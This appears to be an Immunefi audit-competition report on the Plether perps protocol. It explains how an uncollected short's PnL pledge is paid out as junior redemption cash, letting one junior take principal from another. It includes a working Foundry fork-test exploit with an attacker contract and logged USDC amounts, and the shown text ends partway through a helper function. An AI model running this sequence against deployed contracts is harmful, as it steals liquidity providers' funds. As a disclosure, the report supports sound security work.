# \#97677 [SC-Critical] Uncollected flat-short receivable is paid from the other junior's cash

**Submitted on Nov 2nd 2026 at 16:23:37 UTC by @Omisanin0 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97677
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A short filled at the price cap has no price profit left, so the only amount the pool can ever collect from it is the PnL pledge. Once the mark prints below that short's breakpoint, the terminal book values the whole pledge as money the juniors are owed. HousePool then prices a matured junior redemption on that number and sends the USDC from cash that is already in the pool. The short can be closed in the same transaction at an older cap tick that the 15 second order window still accepts. Price PnL on that tick is zero, the pledge never arrives, and the mark stays on the dip. On the launch parameters, the exiting junior was paid 4,859.995131 USDC above a 500,000 USDC deposit. The other junior deposited the same 500,000 USDC, did nothing, and was paid 4,779.985599 USDC less.

## Vulnerability Details

The launch cap is 2.00000000, stored as `2e8`. `CfdMath.calculateExactMaxProfit` returns `max(lots * cap - entry, 0)` for a short. A fill at the cap has a max-profit reserve of 0. The test requires `entry == lots * CAP_PRICE` and stops if that check fails. The 1,000 lot short filled at price 200,000,000. Entry cost was 200,000.000000 USDC. Max profit was 0. VPI at the launch factor of `0.01e18` is a cash charge. It did not change the fill.

The terminal book does not use the max-profit reserve as the collectible cap. `TerminalNavBookV2._curveInputFromEngine` sets the cap to `pnlPledgeAssets + traderClaimBalanceAssets`. `_canonicalize` then clamps a short to its entry cost. The pledge on this position is 9,520.000400 USDC, well under the 200,000.000000 USDC entry, so the clamp does not bind. `effectiveCap` is the pledge, and it is not equal to the entry cost.

`_encode` treats that pair as the flat short. The base coefficient has slope 0 and intercept equal to the pledge. One radix event sits at `ceil((entryCost - pledge) / lots)`, with slope `-lots`. This run puts the breakpoint at 190,480,000, which is $1.90480000. `_terminalLpPriceDeltaAssetAtoms` adds an event only when the mark is at or above the breakpoint. One unit below it, the event is left out and the value is the intercept: +9,520.000400 USDC. At the cap the event is included and the value is 0, because `-lots * cap + entry` is 0. Both prints are in the run. The cap mark, taken before the close is committed, has terminal delta 0. The dip has terminal delta +9,520.000400 USDC.

`HousePoolAccountingLib.buildReconcileSnapshot` adds a positive terminal delta to assets and then calls the result distributable. `buildWithdrawalSnapshot` does not add it. The withdrawal reserve is the max-profit envelope plus trader claims. Max profit here is 0 and the trader has no claim, so free cash remains the USDC the LPs deposited. `HousePool._settleLpEpoch` reconciles before it funds redemptions. The junior phase prices shares off `juniorPrincipal`. `_fundRedemptionPhase` then `safeTransfer`s that amount of settlement token into the vault. The share price includes the receivable. The transfer spends cash the receivable has not delivered.

The close does not put the cash back. `OrderRouter.settleLpEpoch` and `OrderRouter.executeOrder` are both permissionless, and one transaction can call them in this order:

1. Settle on the dip. The dip is inside the current LP hour and strictly newer than the cached mark, so the engine stores it and the matured redeem is funded at the inflated principal.
2. Execute the close with a payload whose publish time is `commitTime + 1`. `PletherOracle._resolveHistoricalOrderBasket` accepts a unique tick in `(commitTime, commitTime + orderSettlementWindow]`. `orderSettlementWindow` is 15 seconds. The success path keeps the parsed basket even when Pyth storage already has a newer price. The close fills at the cap. Price PnL at the cap is 0, so the pledge is not paid in.
3. The mark is not rewound. `OrderRouterExecutionSidecar._updateEngineMark` writes only when `publishTime > lastMarkTime`. `CfdEngine.settlementApplyCarryAndMark` returns without writing when `newMarkTime <= lastMarkTime`. After the transaction the position size is 0, the mark is still the dip, and the receivable has been deleted with the curve.

The older tick is the ordinary historical execution window. What takes the money is funding the redeem with the pledge and closing before the pledge is collected.

The 15 October 2026 scan calls this older fill "Order execution accepts oracle updates older than the engine's cached mark." Its example is a long opened at an older, higher price, so the trader books mark-to-market profit against the pool. This close fills at the cap and the price PnL is 0. The USDC taken from the other junior is the uncollected pledge that HousePool pays on the redeem. Rejecting a fill older than the cached mark stops this sequence. Refusing to fund a redeem with a receivable that has not been collected stops the theft, and that long arbitrage remains.

`packages/perps/SECURITY.md` states the rule this path breaks: "Positive marked receivables are capped by account PnL pledge and nettable same-account claim, and never increase physical redemption funding before collection." The whitepaper, section 3.5, says the same thing: positive marked receivables do not increase the physical cash available to fund redemptions. This redeem pays more physical USDC because of the receivable.

The profitable account is the exiting junior who also holds the short. The test splits those into two addresses so the USDC logs show where each balance came from. One person can hold both. The other junior does not sign anything. They stay in the vault for that epoch and redeem on the next one.

## Impact Details

Impact: Direct theft of any user funds, whether at rest or in motion, other than unclaimed yield. Critical.

The victim's shares are burned. The vault pays them less USDC than they deposited. The shortfall is principal.

The run uses the launch parameters: `vpiFactor` `0.01e18`, initial margin 20 bps, maintenance 10 bps, carry 500 bps, cap `2e8`, frozen close spread 50 bps, senior cap 40,000,000 USDC and max senior share 80%, set through the 72 hour HousePool timelock. Two juniors deposit 500,000 USDC each. The short is 1,000 lots, notional 200,000 USDC, with 10,000 USDC of margin. Settlement token is native USDC (6 decimals). At 1 USDC = $1, the figures below are the dollar amounts. Perps is not on mainnet, so this is the measured loss for this position.

| Account | Deposited (USDC) | Received (USDC) | Difference (USDC) |
|---|---:|---:|---:|
| Exiting junior | 500,000.000000 | 504,859.995131 | +4,859.995131 |
| Other junior | 500,000.000000 | 495,220.014401 | -4,779.985599 |
| Trader | 10,001.000000 | 9,840.800000 | -160.200000 |

The trader deposited 10,000 USDC of margin plus 1 USDC. After the close the clearinghouse returned 9,840.800000 USDC. The 160.200000 USDC gap is the open charge on that short. The junior payment is separate. The pool paid the exiting junior 4,859.995131 USDC of the 9,520.000400 USDC receivable, and the other junior's redeem came up 4,779.985599 USDC short.

Someone who is both the exiting junior and the short nets 4,699.795131 USDC after the open charge. The cash at risk on this position is the other junior's 4,779.985599 USDC. The receivable is the pledge, and the exiting junior is paid their share of it. Two equal juniors split a 9,520.000400 USDC pledge about in half. A junior who owns more of the vault is paid a larger share of the same uncollected pledge, from cash that still belongs to the juniors who remain.

## References

- `packages/perps/src/CfdMath.sol`: `calculateExactPnl` (line 48), `calculateExactMaxProfit` (line 76). Short max profit at the cap is 0.
- `packages/perps/src/TerminalNavBookV2.sol`: `_terminalLpPriceDeltaAssetAtoms` (line 320), `_canonicalize` (line 389), `_curveInputFromEngine` (line 418), `_encode` flat branch (line 592).
- `packages/perps/src/libraries/HousePoolAccountingLib.sol`: `buildWithdrawalSnapshot` (line 46), `buildReconcileSnapshot` (line 60). Positive delta is added to distributable assets. It is not reserved in the withdrawal snapshot.
- `packages/perps/src/HousePool.sol`: `_settleLpEpoch` (line 824) prices the junior redeem off `juniorPrincipal`. `_fundRedemptionPhase` (line 1007) transfers the settlement token.
- `packages/perps/src/OrderRouter.sol`: `updateMarkPrice` (line 429), `settleLpEpoch` (line 479). Both are permissionless.
- `packages/perps/src/OrderRouterExecutionSidecar.sol`: `_updateEngineMark` (line 1053) ignores a publish time that is not newer.
- `packages/perps/src/CfdEngine.sol`: `settlementApplyCarryAndMark` (line 1146) returns when the new mark time is not strictly newer.
- `packages/perps/src/PletherOracle.sol`: `orderSettlementWindow` (line 87) is 15 seconds. `_resolveHistoricalOrderBasket` (line 596) keeps the parsed tick when storage is newer.
- `packages/perps/SECURITY.md` line 393, receivable/cash separation.
- AI scan, 15 October 2026, `audits/scan-plether-fi-plether-core-d4541b49.md`, "Order execution accepts oracle updates older than the engine's cached mark." The older fill is that behavior. The theft is the pledge paid as redemption cash.
- `packages/perps/WHITEPAPER.md` section 3.5, positive marked receivables and redemption funding.
- `packages/perps/DEPLOYMENT.md`, launch parameters used for the economics above.
- Source pin `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.

## Proof of Concept

## Proof of Concept

Run from the Foundry project at `src/foundry.toml` (solc 0.8.35, via-IR, optimizer runs 200). Forge on this machine is 1.5.1. No private key, API key, or Pyth secret is required. If `ARBITRUM_RPC_URL` is unset, or if it is not Arbitrum One, the test forks `https://arbitrum.publicnode.com` at the latest block.

```bash
cd src && forge test --match-path test/fork/F599CleanFork.t.sol --match-contract F599CleanFork -vv
```

One run forked Arbitrum One at the latest block and printed chain id 42161, block 26328055, timestamp 1793634072. The test does not pin that block. Settlement token is native USDC `0xaf88d065e77c8cC2239327C5EDb3A432268e5831`, credited with Foundry `deal`. `setUp` deploys the pin source with `new CfdEngine`, `new HousePool`, `new OrderRouter`, and the other contracts. No in-scope file is edited.

Pyth in the test is `MockPyth` from `packages/shared/test-support`, deployed as the oracle's Pyth endpoint. A signed Pyth update cannot be produced offline, and the program forbids calling live Pyth. One feed, quantity `1e18`, base `1e8`, exponent `-8`, confidence 0, makes `PletherOracle` return the price written in the payload. Foundry has no ArbSys precompile, so the test etches the repo's `ForkArbSys` stub at address 100. That stub returns `block.number`. The helper `F599AtomicKeeper` is the attacker. Its only state-changing calls are `router.settleLpEpoch` and `router.executeOrder`.

The fork clock is moved forward to the next Monday noon (timestamp 1794225600) so seed and trading happen outside the frozen and FAD windows. It is never moved backward.

Steps:

1. Set the launch risk parameters. Propose senior cap 40,000,000 USDC and max senior share 80%. Warp past the 72 hour timelock and finalize. Seed 1 USDC of junior, then 1 USDC of senior. Activate trading.
2. Two juniors each `requestDeposit` 500,000 USDC into the same epoch. At the epoch start, publish the cap through `router.updateMarkPrice`, call `router.settleLpEpoch`, and claim both deposits.
3. The trader deposits 10,001 USDC into the clearinghouse and opens the 1,000 lot short through `router.commitOrder` and `router.executeOrder`. The historical tick is the second after the stored commit time. The order fills. Size is `100000e18`. Entry price is 200,000,000. Entry cost is 200,000.000000 USDC. Max profit is 0.
4. After the one hour deposit cooldown, the attacker junior `requestRedeem`s its full balance. The redeem is scheduled for the next LP hour. The other junior does not redeem.
5. At that epoch start, publish the cap again. Terminal delta is 0. Commit the close: target price 1, margin delta 0, same size, short. Read `pnlPledgeAssets` after the commit. It is 9,520.000400 USDC. The breakpoint is 190,480,000. The dip used below is 190,479,999.
6. Two seconds after the close commit, one transaction settles the dip and then executes the close. The dip payload publishes at that timestamp. The close payload publishes at `commitTime + 1` and carries only the cap price. The close fills at 200,000,000. Position size is 0. Terminal delta at the dip equals the pledge. The engine mark after the close is still 190,479,999, at the dip's publish time.
7. The attacker claims the redeem and receives 504,859.995131 USDC. The trader withdraws 9,840.800000 USDC.
8. The other junior redeems in the following epoch, after a fresh cap mark and another `settleLpEpoch`, and receives 495,220.014401 USDC.

The test locks those totals with `assertEq`.

```text
fork chain id 42161
fork block 26328055
fork timestamp 1793634072
settlement token 0xaf88d065e77c8cC2239327C5EDb3A432268e5831
trading active at 1794225600
step 3 entry price 200000000
step 3 entry cost atoms 200000000000
step 3 max profit atoms 0
step 5 terminal delta at cap 0
step 6 pledge atoms 9520000400
step 6 breakpoint 190480000
step 6 dip mark 190479999
step 6 terminal delta atoms (positive) 9520000400
step 6 close execution price 200000000
step 6 engine mark after close 190479999
step 7 attacker USDC out atoms 504859995131
step 7 trader USDC out atoms 9840800000
step 8 victim USDC out atoms 495220014401
stolen atoms (attacker out minus deposit) 4859995131
victim shortfall atoms 4779985599
```

Full test, `src/test/fork/F599CleanFork.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {ForkArbSys} from "@plether/test-utils/ArbitrumForkSupport.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";
import {Test} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";

/// @title F-599: uncollected flat-short receivable paid out as junior cash
///
/// @notice Local Arbitrum One fork. `setUp` deploys the pin source at the launch parameters in
///         `packages/perps/DEPLOYMENT.md`. No in-scope source is edited. Nothing is broadcast.
///         Do not point this test at a public testnet or at mainnet.
///
///         Run from this Foundry project (`src/foundry.toml`: solc 0.8.35, via_ir, optimizer_runs 200):
///
///             cd src && forge test --match-contract F599CleanFork -vv
///
///         Optional env: `ARBITRUM_RPC_URL`. If it is unset, or if it is not Arbitrum One, the test
///         forks `https://arbitrum.publicnode.com` at the latest block and prints that block.
///         No other env var, token key, or Pyth secret is required. Pyth fee is zero on the stand-in
///         below, so the calls send no ETH.
///
///         Collateral is Arbitrum One native USDC (`0xaf88d065e77c8cC2239327C5EDb3A432268e5831`),
///         credited with Foundry `deal`. There is no MockSettlementToken and no engine or router prank.
///         Opens, closes, marks, and LP settlement go through `OrderRouter.commitOrder`,
///         `updateMarkPrice`, `settleLpEpoch`, and `executeOrder`.
///
///         The one stand-in is `MockPyth`, deployed as the oracle's Pyth endpoint. A signed Pyth
///         update cannot be forged, and the program forbids hitting live Pyth. `MockPyth` supplies
///         the cap print and the dip. On this 10,000 USDC margin the dip is about 4.76% under the
///         cap. At the 20 bps launch minimum the same curve breaks about 0.2% under the cap. The
///         oracle contract is the pin's `PletherOracle`. One component (quantity 1e18,
///         base 1e8, exponent -8, confidence 0) makes the basket equal the authored price, which is
///         what the 8-decimal cap accounting requires. `ForkArbSys` is etched at address 100 because
///         Foundry does not implement the ArbSys precompile; it returns `block.number` and is not a
///         protocol contract. The atomic caller below is the attacker, not a protocol mock: both
///         calls it makes are permissionless router entrypoints.
contract F599AtomicKeeper {

    /// @notice Anyone can call these two router entrypoints. One transaction is what keeps the dip
    ///         mark in place while the already-committed close fills at the older cap tick.
    function settleThenClose(
        OrderRouter router,
        bytes[] calldata dipUpdate,
        uint64 closeOrderId,
        bytes[] calldata capUpdate
    ) external returns (OrderV3Types.ExecutionResult memory result, int256 deltaAssets, uint256 markPrice) {
        router.settleLpEpoch(dipUpdate);
        CfdEngine engine = CfdEngine(address(router.engine()));
        deltaAssets = engine.terminalNavSnapshot().terminalLpPriceDeltaAssets;
        markPrice = engine.lastMarkPrice();
        console2.log("step 6 dip mark", markPrice);
        console2.log("step 6 dip mark time", engine.lastMarkTime());
        if (deltaAssets >= 0) {
            console2.log("step 6 terminal delta atoms (positive)", uint256(deltaAssets));
        } else {
            console2.log("step 6 terminal delta atoms (negative)", uint256(-deltaAssets));
        }
        console2.log("step 6 pool USDC atoms after settle", HousePool(address(engine.pool())).totalAssets());
        result = router.executeOrder(closeOrderId, capUpdate);
    }

    /// @notice The order record's commit time. An external return so via-IR cannot rewrite it to a
    ///         fresh `block.timestamp` after `vm.warp`.
    function storedCommitTime(
        OrderRouter router,
        uint64 orderId
    ) external view returns (uint256 commitTime) {
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(orderId);
        commitTime = uint256(pending.commitTime);
    }

    receive() external payable {}

}

contract F599CleanFork is Test {

    using SafeERC20 for IERC20;

    address internal constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    uint256 internal constant CAP_PRICE = 2e8;
    uint256 internal constant SIZE = 100_000e18;
    uint256 internal constant MARGIN = 10_000e6;
    uint256 internal constant JUNIOR = 500_000e6;
    uint256 internal constant SEED = 1e6;
    bytes32 internal constant FEED_ID = bytes32(uint256(1));

    MarginClearinghouse internal clearinghouse;
    CfdEngine internal engine;
    HousePool internal pool;
    TrancheVault internal juniorVault;
    OrderRouter internal router;
    MockPyth internal pyth;
    F599AtomicKeeper internal attackerKeeper;

    address internal attacker = makeAddr("f599-attacker");
    address internal victim = makeAddr("f599-victim");
    address internal trader = makeAddr("f599-trader");

    function setUp() public {
        _forkArbitrumOne();
        vm.etch(address(100), type(ForkArbSys).runtimeCode);
        require(block.chainid == 42_161, "Arbitrum One fork required");
        console2.log("fork chain id", block.chainid);
        console2.log("fork block", block.number);
        console2.log("fork timestamp", block.timestamp);
        console2.log("settlement token", USDC);

        CfdTypes.RiskParams memory params = CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });

        clearinghouse = new MarginClearinghouse(USDC);
        engine = new CfdEngine(USDC, address(clearinghouse), CAP_PRICE, params, 50);
        engine.setDependencies(
            address(new CfdEnginePlanner()),
            address(new CfdEngineSettlementSidecar(address(engine))),
            address(new CfdEngineAdmin(address(engine), address(this)))
        );
        engine.setTerminalNavBook(address(new TerminalNavBookV2(address(engine), uint32(CAP_PRICE))));
        pool = new HousePool(USDC, address(engine), address(new HousePoolRedemptionMathSidecar()));
        TrancheVault seniorVault =
            new TrancheVault(IERC20(USDC), address(pool), true, "Senior LP", "senAssets", 0, address(0));
        juniorVault = new TrancheVault(IERC20(USDC), address(pool), false, "Junior LP", "junAssets", 0, address(0));
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));

        pyth = new MockPyth();
        bytes32[] memory feedIds = new bytes32[](1);
        feedIds[0] = FEED_ID;
        uint256[] memory quantities = new uint256[](1);
        quantities[0] = 1e18;
        uint256[] memory basePrices = new uint256[](1);
        basePrices[0] = 1e8;
        PletherOracle oracle =
            new PletherOracle(address(engine), address(pool), address(pyth), feedIds, quantities, basePrices, new bool[](1));
        CfdEngineLens lens = new CfdEngineLens(address(engine));
        CfdOrderPolicyEvaluator evaluator = new CfdOrderPolicyEvaluator();
        OrderRouterExecutionSidecar executionSidecar = new OrderRouterExecutionSidecar();
        uint64 nonce = vm.getNonce(address(this));
        address predictedRouter = vm.computeCreateAddress(address(this), nonce + 2);
        OrderLifecycleBook lifecycleBook =
            new OrderLifecycleBook(predictedRouter, address(engine), address(clearinghouse), address(pool));
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        router = new OrderRouter(
            address(engine),
            address(lens),
            address(pool),
            address(oracle),
            address(keeperSidecar),
            address(evaluator),
            address(executionSidecar),
            address(lifecycleBook)
        );
        require(address(router) == predictedRouter, "router address prediction failed");
        engine.setOrderRouter(address(router));
        clearinghouse.setEngine(address(engine));
        attackerKeeper = new F599AtomicKeeper();

        pool.proposePoolConfig(
            IHousePool.PoolConfig({
                seniorRateBps: pool.seniorRateBps(),
                markStalenessLimit: pool.markStalenessLimit(),
                seniorFrozenLpFeeBps: pool.seniorFrozenLpFeeBps(),
                juniorFrozenLpFeeBps: pool.juniorFrozenLpFeeBps(),
                maxSeniorExposureAssets: 40_000_000e6,
                maxSeniorShareBps: 8_000
            })
        );
        _advanceTo(block.timestamp + pool.TIMELOCK_DELAY() + 1);
        pool.finalizePoolConfig();
        _warpToMondayNoon();
        require(!engine.isOracleFrozen(), "seed timestamp is inside the frozen window");
        require(!engine.isFadWindow(), "seed timestamp is inside the FAD window");

        _credit(address(this), SEED * 2);
        IERC20(USDC).forceApprove(address(pool), SEED * 2);
        pool.initializeSeedPosition(false, SEED, address(this));
        pool.initializeSeedPosition(true, SEED, address(this));
        pool.activateTrading();
        console2.log("trading active at", block.timestamp);
        console2.log("launch vpi wad", params.vpiFactor);
        console2.log("launch init margin bps", params.initMarginBps);
    }

    function test_uncollectedFlatShortReceivablePaysTheOtherJunior() public {
        console2.log("step 1 fund two junior deposits of atoms", JUNIOR);
        _fundJuniors(attacker, victim, JUNIOR);
        uint256 attackerShares = juniorVault.balanceOf(attacker);
        uint256 victimShares = juniorVault.balanceOf(victim);
        console2.log("step 1 attacker junior shares", attackerShares);
        console2.log("step 1 victim junior shares", victimShares);
        require(attackerShares > 0 && victimShares > 0, "junior deposits did not mint");

        console2.log("step 2 fund trader margin atoms", MARGIN);
        _fundTrader(trader, MARGIN + 1e6);

        console2.log("step 3 open short through the router at the cap");
        _commitAndExecute(trader, CfdTypes.Side.SHORT, SIZE, MARGIN, CAP_PRICE, int64(int256(CAP_PRICE)), false);
        (uint256 size,, uint256 entryPrice, uint256 maxProfit,,,) = engine.positions(trader);
        uint256 entry = engine.positionEntryCostAssetAtoms(trader);
        uint256 lots = SIZE / 1e20;
        console2.log("step 3 size", size);
        console2.log("step 3 entry price", entryPrice);
        console2.log("step 3 entry cost atoms", entry);
        console2.log("step 3 max profit atoms", maxProfit);
        require(size == SIZE, "short size was not filled");
        require(entry == lots * CAP_PRICE, "open did not fill at the cap; refusing to invent an entry price");
        require(maxProfit == 0, "a short opened at the cap must have no max-profit reserve");

        console2.log("step 4 attacker requests the redeem after the deposit cooldown");
        uint256 unlock = juniorVault.lastDepositTime(attacker) + juniorVault.DEPOSIT_COOLDOWN();
        _advanceTo(unlock);
        uint256 redeemShares = juniorVault.balanceOf(attacker);
        vm.prank(attacker);
        uint256 redeemId = juniorVault.requestRedeem(redeemShares, attacker, attacker);
        uint256 epochStart = pool.lpEpochStart(redeemId);
        console2.log("step 4 redeem epoch", redeemId);
        console2.log("step 4 redeem epoch start", epochStart);
        require(epochStart > block.timestamp, "redeem must mature in a later epoch");
        require(juniorVault.balanceOf(victim) == victimShares, "victim must stay in the pool for this epoch");

        console2.log("step 5 mature the redeem and refresh the cap mark before committing the close");
        _advanceTo(epochStart);
        _publish(int64(int256(CAP_PRICE)));
        int256 deltaAtCap = engine.terminalNavSnapshot().terminalLpPriceDeltaAssets;
        console2.log("step 5 mark", engine.lastMarkPrice());
        console2.log("step 5 mark time", engine.lastMarkTime());
        if (deltaAtCap >= 0) {
            console2.log("step 5 terminal delta at cap", uint256(deltaAtCap));
        } else {
            console2.log("step 5 terminal delta at cap is negative", uint256(-deltaAtCap));
        }
        require(deltaAtCap == 0, "cap mark must not already book the flat receivable");

        uint64 closeId = router.nextCommitId();
        OrderV3Types.OrderRequest memory closeRequest =
            _request(trader, CfdTypes.Side.SHORT, SIZE, 0, 1, true);
        vm.prank(trader);
        router.commitOrder(closeRequest);
        require(router.lifecycleBook().lifecycleStatus(closeId) == OrderV3Types.LifecycleStatus.Pending, "close not pending");
        // via-IR re-reads a `block.timestamp` local after vm.warp. The stored order time does not move.
        uint256 closeCommitTime = attackerKeeper.storedCommitTime(router, closeId);
        console2.log("step 5 close committed", closeId);
        console2.log("step 5 close commit time", closeCommitTime);

        _advanceTo(closeCommitTime + 2);
        closeCommitTime = attackerKeeper.storedCommitTime(router, closeId);
        uint256 attackTime = vm.getBlockTimestamp();
        require(attackTime == closeCommitTime + 2, "dip is outside the 15-second close window");
        uint256 pledge = clearinghouse.pnlPledgeAssets(trader);
        uint256 breakpoint = (entry - pledge + lots - 1) / lots;
        uint256 lowMark = breakpoint - 1;
        console2.log("step 6 pledge atoms", pledge);
        console2.log("step 6 breakpoint", breakpoint);
        console2.log("step 6 dip mark", lowMark);
        assertEq(pledge, 9_520_000_400, "uncollected pledge");
        assertEq(breakpoint, 190_480_000, "flat-short breakpoint");
        assertEq(lowMark, 190_479_999, "dip one unit under the breakpoint");
        require(pledge < entry, "flat branch requires the pledge to be below the entry cost");
        require(lowMark > 0 && lowMark < CAP_PRICE, "dip is outside the price domain");

        console2.log("step 6 one transaction: settle the dip, then fill the close at the cap tick");
        vm.recordLogs();
        (OrderV3Types.ExecutionResult memory closed, int256 deltaAtDip, uint256 markAtDip) = attackerKeeper.settleThenClose(
            router,
            _tick(int64(int256(lowMark)), attackTime, closeCommitTime + 1),
            closeId,
            _tick(int64(int256(CAP_PRICE)), closeCommitTime + 1, closeCommitTime)
        );
        uint256 closePrice = _executedPrice(closeId);
        console2.log("step 6 close status", uint256(closed.status));
        console2.log("step 6 pending reason", uint256(closed.pendingReason));
        console2.log("step 6 terminal reason", uint256(closed.terminalReason));
        console2.log("step 6 close execution price", closePrice);
        console2.log("step 6 engine mark after close", engine.lastMarkPrice());
        console2.log("step 6 engine mark time after close", engine.lastMarkTime());
        require(closed.status == OrderV3Types.LifecycleStatus.Executed, "close did not execute");
        (uint256 sizeAfter,,,,,,) = engine.positions(trader);
        require(sizeAfter == 0, "close left the short open");
        require(closePrice == CAP_PRICE, "close did not fill at the cap");
        require(markAtDip == lowMark, "settlement did not use the dip");
        require(deltaAtDip == int256(pledge), "dip did not book the uncollected pledge");
        require(engine.lastMarkPrice() == lowMark, "older cap tick replaced the dip mark");
        require(engine.lastMarkTime() == attackTime, "dip mark time was rewound");

        uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, attacker);
        console2.log("step 7 attacker claimable shares", claimable);
        require(claimable == redeemShares, "attacker redeem was not fully funded in cash");
        vm.prank(attacker);
        uint256 attackerOut = juniorVault.claimRedeem(redeemId, claimable, attacker, attacker);
        uint256 traderCash = clearinghouse.balanceAssets(trader);
        vm.prank(trader);
        clearinghouse.withdraw(trader, traderCash);
        uint256 traderOut = IERC20(USDC).balanceOf(trader);
        console2.log("step 7 attacker USDC out atoms", attackerOut);
        console2.log("step 7 trader USDC out atoms", traderOut);
        console2.log("step 7 pool USDC atoms after attacker exit", pool.totalAssets());

        console2.log("step 8 victim redeems in the next epoch, after the position is gone");
        uint256 victimOut = _redeemAll(victim);
        console2.log("step 8 victim USDC out atoms", victimOut);
        console2.log("step 8 pool USDC atoms after victim exit", pool.totalAssets());

        require(attackerOut > JUNIOR, "attacker was not paid more than the cash it deposited");
        require(victimOut < JUNIOR, "victim was not paid less than the cash it deposited");
        uint256 stolen = attackerOut - JUNIOR;
        uint256 shortfall = JUNIOR - victimOut;
        console2.log("stolen atoms (attacker out minus deposit)", stolen);
        console2.log("stolen whole USD", stolen / 1e6);
        console2.log("victim shortfall atoms", shortfall);
        console2.log("victim shortfall whole USD", shortfall / 1e6);
        console2.log("trader margin in atoms", MARGIN);
        console2.log("trader margin out atoms", traderOut);
        console2.log(
            "funds at risk: one flat short's uncollected pledge, paid in cash to the exiting junior. Perps is not on mainnet, so this printed loss is the measured amount for this position size."
        );
        assertEq(attackerOut, 504_859_995_131, "attacker USDC out");
        assertEq(victimOut, 495_220_014_401, "victim USDC out");
        assertEq(traderOut, 9_840_800_000, "trader USDC out");
        assertEq(stolen, 4_859_995_131, "attacker gain above its junior deposit");
        assertEq(shortfall, 4_779_985_599, "victim loss below its junior deposit");
        assertEq(traderOut + 160_200_000, MARGIN + 1e6, "trader loss is the open charge, not the junior cash");
    }

    function _forkArbitrumOne() internal {
        string memory url = "https://arbitrum.publicnode.com";
        try vm.envString("ARBITRUM_RPC_URL") returns (string memory configured) {
            if (bytes(configured).length != 0) url = configured;
        } catch {}
        vm.createSelectFork(url);
        if (block.chainid != 42_161) {
            vm.createSelectFork("https://arbitrum.publicnode.com");
        }
    }

    function _warpToMondayNoon() internal {
        uint256 nowTs = block.timestamp;
        uint256 day = nowTs / 1 days;
        uint256 dayOfWeek = (day + 4) % 7;
        uint256 mondayNoon = (day + ((8 - dayOfWeek) % 7)) * 1 days + 12 hours;
        if (mondayNoon <= nowTs) mondayNoon += 7 days;
        _advanceTo(mondayNoon);
    }

    function _advanceTo(
        uint256 target
    ) internal {
        uint256 nowTs = vm.getBlockTimestamp();
        require(target >= nowTs, "fork clock only moves forward");
        if (target != nowTs) vm.warp(target);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _credit(
        address account,
        uint256 amount
    ) internal {
        deal(USDC, account, IERC20(USDC).balanceOf(account) + amount);
        require(IERC20(USDC).balanceOf(account) >= amount, "real USDC deal failed");
    }

    function _fundJuniors(
        address lpA,
        address lpB,
        uint256 amount
    ) internal {
        _credit(lpA, amount);
        _credit(lpB, amount);
        vm.startPrank(lpA);
        IERC20(USDC).forceApprove(address(juniorVault), amount);
        uint256 requestA = juniorVault.requestDeposit(amount, lpA, lpA);
        vm.stopPrank();
        vm.startPrank(lpB);
        IERC20(USDC).forceApprove(address(juniorVault), amount);
        uint256 requestB = juniorVault.requestDeposit(amount, lpB, lpB);
        vm.stopPrank();
        require(requestA == requestB, "juniors must enter the same epoch");
        _advanceTo(pool.lpEpochStart(requestA));
        _publish(int64(int256(CAP_PRICE)));
        router.settleLpEpoch(new bytes[](0));
        require(juniorVault.claimableDepositRequest(requestA, lpA) == amount, "attacker deposit was not funded");
        require(juniorVault.claimableDepositRequest(requestB, lpB) == amount, "victim deposit was not funded");
        vm.prank(lpA);
        juniorVault.claimDeposit(requestA, amount, lpA, lpA);
        vm.prank(lpB);
        juniorVault.claimDeposit(requestB, amount, lpB, lpB);
    }

    function _fundTrader(
        address account,
        uint256 amount
